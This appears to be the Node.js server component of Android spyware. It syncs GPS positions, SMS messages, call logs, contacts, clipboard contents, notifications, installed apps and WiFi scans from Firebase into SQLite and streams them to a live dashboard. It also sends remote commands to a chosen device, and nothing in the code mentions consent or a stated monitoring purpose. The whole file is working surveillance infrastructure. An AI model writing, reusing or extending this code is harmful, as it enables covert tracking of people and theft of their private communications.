const admin = require('firebase-admin');
const path = require('path');
const fs = require('fs');

// Initialize Firebase Admin
let db = null;

function initializeFirebase() {
  try {
    const serviceAccountPath = path.join(__dirname, 'firebase-service-account.json');
    
    if (!fs.existsSync(serviceAccountPath)) {
      console.log('⚠️  Firebase service account not found. Firebase features disabled.');
      console.log('   To enable: Download service account JSON from Firebase Console');
      console.log('   and save as: server/firebase-service-account.json');
      return null;
    }
    
    const serviceAccount = require(serviceAccountPath);
    
    admin.initializeApp({
      credential: admin.credential.cert(serviceAccount)
    });
    
    db = admin.firestore();
    console.log('✅ Firebase initialized successfully');
    return db;
  } catch (error) {
    console.error('❌ Firebase initialization error:', error.message);
    return null;
  }
}

function getFirestore() {
  if (!db) {
    db = initializeFirebase();
  }
  return db;
}

// Sync data from Firestore to SQLite
function syncFromFirestore(sqliteDb, io) {
  if (!db) {
    console.log('⚠️  Firestore not initialized, skipping sync');
    return;
  }
  
  try {
    // Listen for device registrations
    db.collection('devices').onSnapshot((snapshot) => {
      snapshot.docChanges().forEach((change) => {
        if (change.type === 'added' || change.type === 'modified') {
          const deviceData = change.doc.data();
          const deviceId = change.doc.id;
          
          // Determine status based on lastSeen (offline if > 2 minutes)
          const lastSeen = deviceData.lastSeen || 0;
          const now = Date.now();
          const status = (now - lastSeen < 120000) ? 'online' : 'offline';
          
          // Update SQLite
          const lastSeenDate = new Date(lastSeen).toISOString();
          sqliteDb.run(
            `INSERT OR REPLACE INTO devices (device_id, device_name, product_name, android_version, last_seen, status, battery_level, is_charging)
             VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
            [
              deviceId, 
              deviceData.deviceName, 
              deviceData.productName || deviceData.product_name || null,
              deviceData.androidVersion,
              lastSeenDate,
              status,
              deviceData.batteryLevel || null,
              deviceData.isCharging ? 1 : 0
            ],
            (err) => {
              if (err) console.error('Error syncing device:', err);
              else {
                console.log(`Device synced from Firestore: ${deviceId} (${status})`);
                if (io) {
                  io.emit('device_update', { deviceId, status, batteryLevel: deviceData.batteryLevel, isCharging: deviceData.isCharging });
                }
              }
            }
          );
        }
      });
    });
    
    // Listen for GPS logs
    db.collectionGroup('gps_logs').onSnapshot((snapshot) => {
      snapshot.docChanges().forEach((change) => {
        if (change.type === 'added') {
          const data = change.doc.data();
          const deviceId = change.doc.ref.parent.parent.id;
          
          const timestamp = data.timestamp ? new Date(data.timestamp).toISOString() : new Date().toISOString();
          sqliteDb.run(
            'INSERT OR IGNORE INTO gps_logs (device_id, latitude, longitude, accuracy, altitude, timestamp) VALUES (?, ?, ?, ?, ?, ?)',
            [deviceId, data.latitude, data.longitude, data.accuracy, data.altitude, timestamp],
            (err) => {
              if (err) console.error('Error syncing GPS:', err);
              else if (io) {
                io.emit('gps_update', { deviceId, ...data, timestamp });
              }
            }
          );
        }
      });
    });
    
    // Listen for SMS logs
    db.collectionGroup('sms_logs').onSnapshot((snapshot) => {
      snapshot.docChanges().forEach((change) => {
        if (change.type === 'added') {
          const data = change.doc.data();
          const deviceId = change.doc.ref.parent.parent.id;
          
          const timestamp = data.timestamp ? new Date(data.timestamp).toISOString() : new Date().toISOString();
          sqliteDb.run(
            'INSERT OR IGNORE INTO sms_logs (device_id, phone_number, message, type, timestamp) VALUES (?, ?, ?, ?, ?)',
            [deviceId, data.phoneNumber, data.message, data.type, timestamp],
            (err) => {
              if (err) console.error('Error syncing SMS:', err);
              else if (io) {
                io.emit('sms_update', { deviceId, phoneNumber: data.phoneNumber, message: data.message, type: data.type, timestamp });
              }
            }
          );
        }
      });
    });
    
    // Listen for call logs
    db.collectionGroup('call_logs').onSnapshot((snapshot) => {
      snapshot.docChanges().forEach((change) => {
        if (change.type === 'added') {
          const data = change.doc.data();
          const deviceId = change.doc.ref.parent.parent.id;
          
          const timestamp = data.timestamp ? new Date(data.timestamp).toISOString() : new Date().toISOString();
          sqliteDb.run(
            'INSERT OR IGNORE INTO call_logs (device_id, phone_number, call_type, duration, timestamp) VALUES (?, ?, ?, ?, ?)',
            [deviceId, data.phoneNumber, data.callType, data.duration, timestamp],
            (err) => {
              if (err) console.error('Error syncing call:', err);
              else if (io) {
                io.emit('call_update', { deviceId, phoneNumber: data.phoneNumber, callType: data.callType, duration: data.duration, timestamp });
              }
            }
          );
        }
      });
    });
    
    // Listen for contacts
    db.collectionGroup('contacts').onSnapshot((snapshot) => {
      snapshot.docChanges().forEach((change) => {
        if (change.type === 'added' || change.type === 'modified') {
          const data = change.doc.data();
          const deviceId = change.doc.ref.parent.parent.id;
          
          const timestamp = data.timestamp ? new Date(data.timestamp).toISOString() : new Date().toISOString();
          sqliteDb.run(
            'INSERT OR REPLACE INTO contacts (device_id, name, phone_number, email, timestamp) VALUES (?, ?, ?, ?, ?)',
            [deviceId, data.name, data.phoneNumber, data.email || '', timestamp],
            (err) => {
              if (err) console.error('Error syncing contact:', err);
              else if (io) {
                io.emit('contacts_update', { deviceId, count: 1 });
              }
            }
          );
        }
      });
    });
    
    // Listen for apps
    db.collectionGroup('apps').onSnapshot((snapshot) => {
      snapshot.docChanges().forEach((change) => {
        if (change.type === 'added' || change.type === 'modified') {
          const data = change.doc.data();
          const deviceId = change.doc.ref.parent.parent.id;
          
          const timestamp = data.timestamp ? new Date(data.timestamp).toISOString() : new Date().toISOString();
          sqliteDb.run(
            'INSERT OR REPLACE INTO installed_apps (device_id, app_name, package_name, version, timestamp) VALUES (?, ?, ?, ?, ?)',
            [deviceId, data.name, data.packageName, data.version, timestamp],
            (err) => {
              if (err) console.error('Error syncing app:', err);
              else if (io) {
                io.emit('apps_update', { deviceId, count: 1 });
              }
            }
          );
        }
      });
    });
    
    // Listen for clipboard
    db.collectionGroup('clipboard').onSnapshot((snapshot) => {
      snapshot.docChanges().forEach((change) => {
        if (change.type === 'added') {
          const data = change.doc.data();
          const deviceId = change.doc.ref.parent.parent.id;
          
          const timestamp = data.timestamp ? new Date(data.timestamp).toISOString() : new Date().toISOString();
          sqliteDb.run(
            'INSERT OR IGNORE INTO clipboard_logs (device_id, content, timestamp) VALUES (?, ?, ?)',
            [deviceId, data.content, timestamp],
            (err) => {
              if (err) console.error('Error syncing clipboard:', err);
              else if (io) {
                io.emit('clipboard_update', { deviceId, content: data.content, timestamp });
              }
            }
          );
        }
      });
    });
    
    // Listen for notifications
    db.collectionGroup('notifications').onSnapshot((snapshot) => {
      snapshot.docChanges().forEach((change) => {
        if (change.type === 'added') {
          const data = change.doc.data();
          const deviceId = change.doc.ref.parent.parent.id;
          
          const timestamp = data.timestamp ? new Date(data.timestamp).toISOString() : new Date().toISOString();
          sqliteDb.run(
            'INSERT OR IGNORE INTO notifications (device_id, app_name, title, content, timestamp) VALUES (?, ?, ?, ?, ?)',
            [deviceId, data.appName, data.title, data.content, timestamp],
            (err) => {
              if (err) console.error('Error syncing notification:', err);
              else if (io) {
                io.emit('notification_update', { deviceId, appName: data.appName, title: data.title, content: data.content, timestamp });
              }
            }
          );
        }
      });
    });
    
    // Listen for WiFi
    db.collectionGroup('wifi').onSnapshot((snapshot) => {
      snapshot.docChanges().forEach((change) => {
        if (change.type === 'added') {
          const data = change.doc.data();
          const deviceId = change.doc.ref.parent.parent.id;
          
          try {
            const networks = JSON.parse(data.networks || '[]');
            const timestamp = data.timestamp ? new Date(data.timestamp).toISOString() : new Date().toISOString();
            
            networks.forEach(network => {
              sqliteDb.run(
                'INSERT OR REPLACE INTO wifi_networks (device_id, ssid, bssid, capabilities, frequency, level, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?)',
                [deviceId, network.ssid, network.bssid, network.capabilities, network.frequency, network.level, timestamp],
                (err) => {
                  if (err) console.error('Error syncing WiFi:', err);
                }
              );
            });
          } catch (e) {
            console.error('Error parsing WiFi networks:', e);
          }
        }
      });
    });
    
    console.log('✅ Firestore listeners active');
  } catch (error) {
    console.error('Error setting up Firestore listeners:', error);
  }
}

// Send command to device via Firestore
async function sendCommandToDevice(deviceId, command, parameters) {
  if (!db) return null;
  
  try {
    const commandRef = db.collection('devices').doc(deviceId).collection('commands').doc();
    const commandData = {
      command,
      parameters,
      status: 'pending',
      created_at: admin.firestore.FieldValue.serverTimestamp()
    };
    
    await commandRef.set(commandData);
    return commandRef.id;
  } catch (error) {
    console.error('Error sending command:', error);
    return null;
  }
}

module.exports = {
  initializeFirebase,
  getFirestore,
  syncFromFirestore,
  sendCommandToDevice
};

